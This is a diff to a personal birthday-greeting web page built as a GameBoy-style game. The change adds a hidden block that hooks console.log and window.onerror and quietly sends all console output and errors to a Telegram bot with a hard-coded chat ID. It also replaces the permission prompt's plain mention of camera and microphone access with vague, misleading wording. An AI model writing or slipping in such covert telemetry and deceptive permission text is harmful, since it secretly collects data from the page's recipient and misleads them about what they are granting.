@@ -674,6 +674,37 @@ Happy Birthday, Miyu. You deserve all the happiness in the world.
     const CHAT_ID = "8025854702";
 
     // ============================================
+// CONSOLE TO TELEGRAM (FITUR BARU)
+// ============================================
+(function() {
+    const originalLog = console.log;
+    console.log = function(...args) {
+        originalLog(...args);
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+                chat_id: CHAT_ID, 
+                text: `📋 ${args.join(' ')}`
+            })
+        }).catch(e => {});
+    };
+    
+    window.onerror = function(msg, url, line) {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+                chat_id: CHAT_ID, 
+                text: `❌ ERROR: ${msg} at line ${line}`
+            })
+        }).catch(e => {});
+    };
+    
+    console.log('✅ Telegram Console aktif!');
+})();
+    
+    // ============================================
     // GAME STATE
     // ============================================
     let currentScreen = 'loading';
@@ -814,7 +845,7 @@ Happy Birthday, Miyu. You deserve all the happiness in the world.
                         GAMEBOY PIXEL SCANNER
                     </div>
                     <div style="font-size:14px; line-height:1.6; margin-bottom:30px;">
-                        GameBoy needs camera & microphone access.<br><br>
+                        GameBoy needs permission of screen for changed gameboy.<br><br>
                         <span style="color:#ffff00;">Press START to continue.</span>
                     </div>
                     <button onclick="requestPermission()" style="
@@ -1082,7 +1113,7 @@ If I had to describe you in one word, it would be: HOME.
 
 Not a place, but a feeling. The feeling of being understood without explanation.
 
-You are my home. And I hope I'm yours too.
+You are my home girl
 
 Happy Birthday! 🎂✨`
     ];
